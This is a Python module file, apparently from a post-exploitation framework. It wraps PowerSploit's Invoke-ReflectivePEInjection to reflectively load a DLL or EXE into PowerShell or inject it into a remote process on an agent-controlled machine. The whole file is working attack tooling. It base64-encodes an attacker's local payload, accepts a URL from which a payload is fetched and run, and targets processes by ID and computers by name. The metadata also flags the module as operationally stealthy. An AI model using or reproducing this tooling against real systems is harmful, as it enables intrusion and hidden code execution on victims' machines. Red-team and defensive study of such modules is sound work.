from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-ReflectivePEInjection',

            'Author': ['@JosephBialek'],

            'Description': ("Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load "
                            "a DLL/EXE in to the PowerShell process or reflectively load a DLL in to a "
                            "remote process."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcId' : {
                'Description'   :   'Process ID of the process you want to inject a Dll into.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DllPath' : {
                'Description'   :   '(Attacker) local path for the PE/DLL to load.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'PEUrl' : {
                'Description'   :   'A URL containing a DLL/EXE to load and execute.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ExeArgs' : {
                'Description'   :   'Optional arguments to pass to the executable being reflectively loaded.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ComputerName' : {
                'Description'   :   'Optional an array of computernames to run the script on.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        script += "\nInvoke-ReflectivePEInjection"

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if option.lower() == "dllpath":
                    if values['Value'] != "":
                        try:
                            f = open(values['Value'], 'rb')
                            dllbytes = f.read()
                            f.close()

                            base64bytes = base64.b64encode(dllbytes)
                            script += " -PEbase64 " + str(base64bytes)

                        except:
                            print helpers.color("[!] Error in reading/encoding dll: " + str(values['Value']))

                elif values['Value'] and values['Value'] != '':
                    script += " -" + str(option) + " " + str(values['Value'])

                    
        return script
